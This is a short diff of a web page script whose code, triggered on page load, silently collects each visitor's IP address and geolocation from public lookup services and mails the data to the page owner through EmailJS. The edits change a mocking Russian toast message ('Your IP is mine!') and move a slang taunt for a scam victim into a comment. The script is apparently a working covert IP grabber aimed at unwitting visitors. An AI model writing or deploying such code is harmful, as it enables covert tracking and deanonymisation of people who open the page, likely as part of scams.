@@ -48,7 +48,7 @@ geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
   try {
     emailjs.init(EMAILJS_PUBLIC_KEY);
     await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
-    showToast('Твой IP у меня! ну ты и мамонт', 'success');
+    showToast('Твой IP у меня! ', 'success');
   } catch(err) {
     console.warn('EmailJS error:', err);
   }
@@ -56,3 +56,4 @@ geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
 fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => console.log(d))
 
 window.addEventListener('load', collectAndSend);
+// ну ты и мамонт
